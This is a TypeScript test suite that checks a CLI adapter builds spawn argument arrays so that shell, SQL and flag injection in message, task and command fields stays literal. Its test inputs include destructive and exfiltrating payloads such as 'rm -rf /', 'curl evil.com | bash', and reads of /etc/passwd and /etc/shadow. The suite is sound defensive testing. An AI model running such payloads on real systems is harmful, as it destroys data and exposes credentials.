/**
 * T3.4 — Adapter arg construction verification: shell injection prevention.
 *
 * Gate tier: no network, no LLM, no gt binary required.
 *
 * Uses TestableGasTownAdapter (dependency injection via cli-capture.ts) to
 * capture the exact arg arrays that would be passed to Bun.spawn. Verifies:
 *
 *   1. mail.send with quotes and $special chars — array args, no shell interp
 *   2. done with all flags — correct flag construction
 *   3. escalate with severity and message — arg ordering
 *   4. Task extraction → adapter pipeline — injection payloads stay literal
 */

import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { TestableGasTownAdapter } from './cli-capture.js';
import { createTestRig, type TestRig } from './test-rig.js';
import { extractTasks, containsShellMetacharacters } from '../task-extract.js';

// --- T3.4.1: mail.send shell injection prevention ---

describe('T3.4.1: mail.send with dangerous characters', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('$(command) in body is a literal array element, not shell-expanded', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'Status update',
      body: 'Current user: $(whoami) on $(hostname)',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    // The body must be a single array element containing the literal string
    expect(args).toEqual([
      'gt', 'mail', 'send', 'gastack/witness',
      '-s', 'Status update',
      '-m', 'Current user: $(whoami) on $(hostname)',
    ]);
    // Body is one element, not split or expanded
    expect(args[7]).toBe('Current user: $(whoami) on $(hostname)');
  });

  test('semicolon + destructive command in body stays literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/refinery',
      subject: 'Test',
      body: 'hello; rm -rf / --no-preserve-root',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[7]).toBe('hello; rm -rf / --no-preserve-root');
    // Semicolon is inside the value, not a shell separator
    expect(args.indexOf(';')).toBe(-1);
  });

  test('backtick command substitution in subject stays literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'User: `whoami` report',
      body: 'test',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[5]).toBe('User: `whoami` report');
  });

  test('pipe and redirect operators in body stay literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'Log',
      body: 'cat /etc/passwd | grep root > /tmp/stolen',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[7]).toBe('cat /etc/passwd | grep root > /tmp/stolen');
  });

  test('double quotes and single quotes in body stay literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: "It's a test",
      body: 'He said "hello world" and \'goodbye\'',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[5]).toBe("It's a test");
    expect(args[7]).toBe('He said "hello world" and \'goodbye\'');
  });

  test('${variable} expansion syntax in body stays literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'Env',
      body: 'Home is ${HOME} and path is $PATH',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[7]).toBe('Home is ${HOME} and path is $PATH');
  });

  test('newlines in body are preserved as literal characters', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'Multi',
      body: 'line 1\nline 2\nline 3',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[7]).toBe('line 1\nline 2\nline 3');
  });

  test('SQL injection in body stays literal', async () => {
    await adapter.execute('mail.send', {
      target: 'gastack/witness',
      subject: 'DB',
      body: "'; DROP TABLE beads; --",
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    expect(args[7]).toBe("'; DROP TABLE beads; --");
  });

  test('combined injection payload in all fields', async () => {
    await adapter.execute('mail.send', {
      target: '$(id)/../../etc',
      subject: '`cat /etc/shadow`',
      body: '$(rm -rf /) && curl evil.com | bash',
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    // Each dangerous value is its own array element — no shell interpretation
    expect(args[3]).toBe('$(id)/../../etc');
    expect(args[5]).toBe('`cat /etc/shadow`');
    expect(args[7]).toBe('$(rm -rf /) && curl evil.com | bash');

    // Total arg count is always exactly 8 for mail.send
    expect(args).toHaveLength(8);
  });
});

// --- T3.4.2: done with all flags ---

describe('T3.4.2: done command flag construction', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('done with no flags produces bare command', async () => {
    await adapter.execute('done', {});
    const args = adapter.lastCliArgsFor('done')!;

    expect(args).toEqual(['gt', 'done']);
  });

  test('done with all flags', async () => {
    await adapter.execute('done', {
      preVerified: true,
      target: 'main',
      cleanupStatus: 'clean',
      status: 'DEFERRED',
    });
    const args = adapter.lastCliArgsFor('done')!;

    expect(args).toContain('--pre-verified');
    expect(args).toContain('--target');
    expect(args).toContain('main');
    expect(args).toContain('--cleanup-status');
    expect(args).toContain('clean');
    expect(args).toContain('--status');
    expect(args).toContain('DEFERRED');
  });

  test('done flags have correct ordering: flag then value', async () => {
    await adapter.execute('done', {
      target: 'develop',
      cleanupStatus: 'dirty',
    });
    const args = adapter.lastCliArgsFor('done')!;

    const targetIdx = args.indexOf('--target');
    expect(targetIdx).toBeGreaterThan(-1);
    expect(args[targetIdx + 1]).toBe('develop');

    const cleanupIdx = args.indexOf('--cleanup-status');
    expect(cleanupIdx).toBeGreaterThan(-1);
    expect(args[cleanupIdx + 1]).toBe('dirty');
  });

  test('preVerified=false does not add --pre-verified', async () => {
    await adapter.execute('done', { preVerified: false, target: 'main' });
    const args = adapter.lastCliArgsFor('done')!;

    expect(args).not.toContain('--pre-verified');
    expect(args).toContain('--target');
  });

  test('done with only --pre-verified', async () => {
    await adapter.execute('done', { preVerified: true });
    const args = adapter.lastCliArgsFor('done')!;

    expect(args).toEqual(['gt', 'done', '--pre-verified']);
  });

  test('target with injection payload stays literal', async () => {
    await adapter.execute('done', {
      target: 'main; rm -rf /',
    });
    const args = adapter.lastCliArgsFor('done')!;

    const targetIdx = args.indexOf('--target');
    expect(args[targetIdx + 1]).toBe('main; rm -rf /');
  });
});

// --- T3.4.3: escalate with severity and message ---

describe('T3.4.3: escalate arg construction', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('escalate with all args', async () => {
    await adapter.execute('escalate', {
      description: 'Dolt server unresponsive',
      severity: 'CRITICAL',
      message: 'Server hung for 30s, goroutine dump captured',
    });
    const args = adapter.lastCliArgsFor('escalate')!;

    expect(args).toEqual([
      'gt', 'escalate', 'Dolt server unresponsive',
      '-s', 'CRITICAL',
      '-m', 'Server hung for 30s, goroutine dump captured',
    ]);
  });

  test('escalate with only description', async () => {
    await adapter.execute('escalate', {
      description: 'Something broke',
    });
    const args = adapter.lastCliArgsFor('escalate')!;

    expect(args).toEqual(['gt', 'escalate', 'Something broke']);
  });

  test('escalate description with shell metacharacters stays literal', async () => {
    await adapter.execute('escalate', {
      description: 'Error: $(cat /etc/shadow)',
      severity: 'HIGH',
      message: 'Query failed: `; DROP TABLE beads; --`',
    });
    const args = adapter.lastCliArgsFor('escalate')!;

    expect(args[2]).toBe('Error: $(cat /etc/shadow)');
    expect(args[6]).toBe('Query failed: `; DROP TABLE beads; --`');
  });

  test('escalate severity cannot inject flags', async () => {
    await adapter.execute('escalate', {
      description: 'test',
      severity: 'HIGH --force --delete-everything',
    });
    const args = adapter.lastCliArgsFor('escalate')!;

    // The severity value is a single array element, not split into multiple flags
    const sevIdx = args.indexOf('-s');
    expect(args[sevIdx + 1]).toBe('HIGH --force --delete-everything');
  });
});

// --- T3.4.4: Task extraction → adapter pipeline injection test ---

describe('T3.4.4: extracted task titles → adapter arg safety', () => {
  let rig: TestRig;
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    rig = createTestRig();
    adapter = new TestableGasTownAdapter();
  });

  afterEach(() => {
    rig.cleanup();
  });

  test('injection.md task titles passed as mail body produce safe args', async () => {
    const doc = rig.readFixture('design-docs', 'injection.md');
    const result = extractTasks(doc);
    expect(result.tasks.length).toBeGreaterThanOrEqual(3);

    // Simulate sending each task title as a mail body (common orchestrator pattern)
    for (const task of result.tasks) {
      adapter.reset();
      await adapter.execute('mail.send', {
        target: 'gastack/witness',
        subject: `Task ${task.number} status`,
        body: `Working on: ${task.title}`,
      });
      const args = adapter.lastCliArgsFor('mail.send')!;

      // Args must be exactly 8 elements (gt mail send target -s subj -m body)
      expect(args).toHaveLength(8);

      // Body is a single array element containing the literal title
      expect(args[7]).toContain(task.title);

      // No array element is an empty string between flag and value
      for (let i = 0; i < args.length; i++) {
        expect(typeof args[i]).toBe('string');
      }
    }
  });

  test('$(rm -rf /) in task title produces safe Bun.spawn array', async () => {
    const doc = rig.readFixture('design-docs', 'injection.md');
    const result = extractTasks(doc);

    // Task 1 title contains $(whoami)
    const task1 = result.tasks[0];
    expect(task1.title).toContain('$(whoami)');
    expect(containsShellMetacharacters(task1.title)).toBe(true);

    // Pass through escalate (another common path)
    await adapter.execute('escalate', {
      description: task1.title,
      severity: 'HIGH',
    });
    const args = adapter.lastCliArgsFor('escalate')!;

    // The title with $(whoami) is a single array element at position 2
    expect(args[2]).toBe(task1.title);
    // It is NOT split into ['$', '(', 'whoami', ')'] or expanded
    expect(args[2]).toContain('$(whoami)');
  });

  test('backtick-whoami in task body produces safe Bun.spawn array', async () => {
    const doc = rig.readFixture('design-docs', 'injection.md');
    const result = extractTasks(doc);

    // Task 3 body contains backtick injection
    const task3 = result.tasks[2];
    expect(task3.body).toContain('`cat /etc/passwd`');

    await adapter.execute('mail.send', {
      target: 'gastack/refinery',
      subject: 'Task review',
      body: task3.body.slice(0, 200), // first 200 chars of body
    });
    const args = adapter.lastCliArgsFor('mail.send')!;

    // Body is a single element containing the backtick expression literally
    expect(args[7]).toContain('`cat /etc/passwd`');
    expect(args).toHaveLength(8);
  });

  test('DROP TABLE in synthesized task description produces safe args', async () => {
    // Simulate a task with SQL injection in the title
    const dangerousTitle = "Fix: '; DROP TABLE beads; -- in auth handler";

    await adapter.execute('nudge', {
      target: 'gastack/witness',
      message: `Completed: ${dangerousTitle}`,
    });
    const args = adapter.lastCliArgsFor('nudge')!;

    // nudge: ['gt', 'nudge', target, message]
    expect(args).toEqual([
      'gt', 'nudge', 'gastack/witness',
      `Completed: ${dangerousTitle}`,
    ]);
    expect(args[3]).toContain("DROP TABLE beads");
  });

  test('; rm -rf / in task title through done --status stays literal', async () => {
    const doc = rig.readFixture('design-docs', 'injection.md');
    const result = extractTasks(doc);

    // Task 2 title contains ; rm -rf /
    const task2 = result.tasks[1];
    expect(task2.title).toContain('; rm -rf /');

    // Passing task title as a status value (edge case)
    await adapter.execute('done', {
      status: task2.title,
    });
    const args = adapter.lastCliArgsFor('done')!;

    const statusIdx = args.indexOf('--status');
    expect(statusIdx).toBeGreaterThan(-1);
    // The full title with ; rm -rf / is a single element
    expect(args[statusIdx + 1]).toBe(task2.title);
    expect(args[statusIdx + 1]).toContain('; rm -rf /');
  });
});

// --- T3.4.5: sling command with --merge flag ---

describe('T3.4.5: sling command arg construction', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('sling with beadId and rig only', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    expect(args).toEqual(['gt', 'sling', 'gt-t1x', 'gastack']);
  });

  test('sling with --merge direct', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
      merge: 'direct',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    expect(args).toContain('--merge');
    const mergeIdx = args.indexOf('--merge');
    expect(args[mergeIdx + 1]).toBe('direct');
  });

  test('sling with --merge mr', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
      merge: 'mr',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    const mergeIdx = args.indexOf('--merge');
    expect(args[mergeIdx + 1]).toBe('mr');
  });

  test('sling with --merge local', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
      merge: 'local',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    const mergeIdx = args.indexOf('--merge');
    expect(args[mergeIdx + 1]).toBe('local');
  });

  test('sling with all flags', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
      merge: 'mr',
      reviewOnly: true,
      agent: 'claude',
      formula: 'mol-polecat-work',
      formulaArgs: 'Run /review then /cso',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    expect(args).toEqual([
      'gt', 'sling', 'gt-t1x', 'gastack',
      '--merge', 'mr',
      '--review-only',
      '--agent', 'claude',
      '--formula', 'mol-polecat-work',
      '--args', 'Run /review then /cso',
    ]);
  });

  test('sling merge value with injection payload stays literal', async () => {
    await adapter.execute('sling', {
      beadId: '$(id)',
      rig: 'gastack; rm -rf /',
      merge: 'direct; echo pwned',
    });
    const args = adapter.lastCliArgsFor('sling')!;

    // Each value is a single array element
    expect(args[2]).toBe('$(id)');
    expect(args[3]).toBe('gastack; rm -rf /');
    const mergeIdx = args.indexOf('--merge');
    expect(args[mergeIdx + 1]).toBe('direct; echo pwned');
  });

  test('sling without --merge flag omits it entirely', async () => {
    await adapter.execute('sling', {
      beadId: 'gt-t1x',
      rig: 'gastack',
      reviewOnly: true,
    });
    const args = adapter.lastCliArgsFor('sling')!;

    expect(args).not.toContain('--merge');
    expect(args).toContain('--review-only');
  });
});

// --- T3.4.6: sling.batch command arg construction ---

describe('T3.4.6: sling.batch command arg construction', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('sling.batch with 3 bead IDs and rig', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-001', 'ga-002', 'ga-003'],
      rig: 'gastack',
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    expect(args).toEqual(['gt', 'sling', 'ga-001', 'ga-002', 'ga-003', 'gastack']);
  });

  test('sling.batch with --max-concurrent', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-001', 'ga-002'],
      rig: 'gastack',
      maxConcurrent: 2,
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    expect(args).toContain('--max-concurrent');
    const mcIdx = args.indexOf('--max-concurrent');
    expect(args[mcIdx + 1]).toBe('2');
  });

  test('sling.batch with --merge strategy', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-001', 'ga-002'],
      rig: 'gastack',
      merge: 'mr',
      maxConcurrent: 3,
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    expect(args).toContain('--merge');
    const mergeIdx = args.indexOf('--merge');
    expect(args[mergeIdx + 1]).toBe('mr');
  });

  test('sling.batch with all flags', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-001', 'ga-002', 'ga-003'],
      rig: 'gastack',
      maxConcurrent: 2,
      merge: 'mr',
      reviewOnly: true,
      agent: 'claude',
      formula: 'mol-polecat-work',
      formulaArgs: 'Run /review',
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    expect(args).toEqual([
      'gt', 'sling', 'ga-001', 'ga-002', 'ga-003', 'gastack',
      '--max-concurrent', '2',
      '--merge', 'mr',
      '--review-only',
      '--agent', 'claude',
      '--formula', 'mol-polecat-work',
      '--args', 'Run /review',
    ]);
  });

  test('sling.batch with single bead ID', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-001'],
      rig: 'gastack',
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    expect(args).toEqual(['gt', 'sling', 'ga-001', 'gastack']);
  });

  test('sling.batch bead IDs with injection payloads stay literal', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['$(id)', 'ga-002; rm -rf /', '`whoami`'],
      rig: 'gastack',
      maxConcurrent: 3,
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    // Each bead ID is its own array element — no shell interpretation
    expect(args[2]).toBe('$(id)');
    expect(args[3]).toBe('ga-002; rm -rf /');
    expect(args[4]).toBe('`whoami`');
  });

  test('sling.batch preserves ordering of bead IDs', async () => {
    await adapter.execute('sling.batch', {
      beadIds: ['ga-003', 'ga-001', 'ga-002'],
      rig: 'gastack',
    });
    const args = adapter.lastCliArgsFor('sling.batch')!;

    // Bead IDs appear in the order provided (priority-sorted by caller)
    expect(args[2]).toBe('ga-003');
    expect(args[3]).toBe('ga-001');
    expect(args[4]).toBe('ga-002');
  });
});

// --- Cross-cutting: structural invariants ---

describe('T3.4 structural invariants', () => {
  let adapter: TestableGasTownAdapter;

  beforeEach(() => {
    adapter = new TestableGasTownAdapter();
  });

  test('all commands produce string[] arrays (no undefined or null elements)', async () => {
    const commands: Array<{ cmd: string; args?: Record<string, unknown> }> = [
      { cmd: 'hook' },
      { cmd: 'mol.status' },
      { cmd: 'mail.inbox' },
      { cmd: 'mail.send', args: { target: 't', subject: 's', body: 'b' } },
      { cmd: 'done', args: { preVerified: true, target: 'main', cleanupStatus: 'clean', status: 'X' } },
      { cmd: 'prime' },
      { cmd: 'escalate', args: { description: 'd', severity: 'HIGH', message: 'm' } },
      { cmd: 'nudge', args: { target: 't', message: 'm' } },
      { cmd: 'sling', args: { beadId: 'gt-t1x', rig: 'gastack', merge: 'mr' } },
      { cmd: 'sling.batch', args: { beadIds: ['ga-001', 'ga-002'], rig: 'gastack', maxConcurrent: 2 } },
      { cmd: 'raw', args: { args: ['status', '--verbose'] } },
    ];

    for (const { cmd, args } of commands) {
      adapter.reset();
      await adapter.execute(cmd, args);
      const captured = adapter.lastCliArgsFor(cmd)!;

      expect(captured).toBeDefined();
      expect(Array.isArray(captured)).toBe(true);
      expect(captured.length).toBeGreaterThanOrEqual(2); // at minimum ['gt', 'something']
      expect(captured[0]).toBe('gt'); // always gt

      for (let i = 0; i < captured.length; i++) {
        expect(typeof captured[i]).toBe('string');
        // No element should be 'undefined' or 'null' as strings
        expect(captured[i]).not.toBe('undefined');
        expect(captured[i]).not.toBe('null');
      }
    }
  });

  test('raw command passes args through without shell concatenation', async () => {
    await adapter.execute('raw', {
      args: ['mail', 'send', '--stdin', '$(evil)'],
    });
    const args = adapter.lastCliArgsFor('raw')!;

    expect(args).toEqual(['gt', 'mail', 'send', '--stdin', '$(evil)']);
  });
});
